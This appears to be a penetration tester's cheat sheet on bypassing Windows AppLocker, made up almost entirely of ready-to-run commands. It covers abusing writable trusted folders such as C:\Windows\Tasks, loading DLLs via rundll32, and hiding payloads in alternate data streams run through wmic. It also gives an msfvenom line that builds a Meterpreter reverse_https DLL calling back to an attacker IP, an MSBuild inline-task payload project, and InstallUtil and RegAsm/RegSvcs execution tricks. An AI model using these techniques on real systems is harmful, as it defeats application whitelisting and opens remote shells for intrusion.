---
tags:
  - Advanced
  - AppLocker_Bypass
  - Defense_Evasion
  - Windows
---

## AppLocker Basic Bypasses
resources: [LOLBAS Project](https://lolbas-project.github.io/)

> [!info] Default AppLocker rules allow execution from trusted paths. Writable subdirectories may exist.

### Trusted Folders Bypass

#### Find Writable Directories [Remote]
```powershell
# Check for writable folders in Program Files
Get-ChildItem "C:\Program Files" -Recurse -Directory | ForEach-Object {
    $acl = Get-Acl $_.FullName
    if ($acl.Access | Where-Object { $_.FileSystemRights -match "Write" -and $_.IdentityReference -match "Users" }) {
        $_.FullName
    }
}
```

```cmd
icacls "C:\Program Files" /T /C 2>nul | findstr /i "Users:(F) Users:(M) Users:(W) BUILTIN\Users:(F) BUILTIN\Users:(M) BUILTIN\Users:(W)"
```

#### Common Writable Locations
> [!tip] Common writable paths:
> - **C:\Windows\Tasks** - Often writable
> - **C:\Windows\Temp** - Usually writable
> - **C:\Windows\tracing** - Sometimes writable
> - **C:\Windows\System32\spool\drivers\color** - Often writable

#### Copy and Execute from Trusted Path [Remote]
```cmd
copy payload.exe C:\Windows\Tasks\
C:\Windows\Tasks\payload.exe
```

### DLL Bypass
> [!warning] If DLL rules aren't enabled (default), arbitrary DLLs can be loaded.

#### Check if DLL Rules Active [Remote]
```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | Where-Object { $_.RuleCollectionType -eq "Dll" }
```

#### Rundll32 Execution [Remote]
```cmd
rundll32.exe payload.dll,EntryPoint
```

#### Create Payload DLL [Local]
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f dll -o payload.dll
```

### Alternate Data Streams
> [!tip] Hide executables in Alternate Data Streams of legitimate files.

#### Create ADS [Remote]
```cmd
type payload.exe > "C:\Windows\Tasks\legitimate.txt:payload.exe"
```

#### Execute from ADS [Remote]
```cmd
wmic process call create "C:\Windows\Tasks\legitimate.txt:payload.exe"
```

#### List ADS [Remote]
```cmd
dir /r C:\Windows\Tasks\
```

```powershell
Get-Item -Path "C:\Windows\Tasks\*" -Stream *
```

### Third Party Execution
> [!tip] Use trusted applications to execute code.

#### MSBuild Execution [Remote]
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

#### MSBuild Payload File
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample : Task, ITask {
          public override bool Execute() {
            System.Diagnostics.Process.Start("calc.exe");
            return true;
          }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

#### InstallUtil Execution [Remote]
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

#### RegAsm/RegSvcs Execution [Remote]
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe payload.dll
```
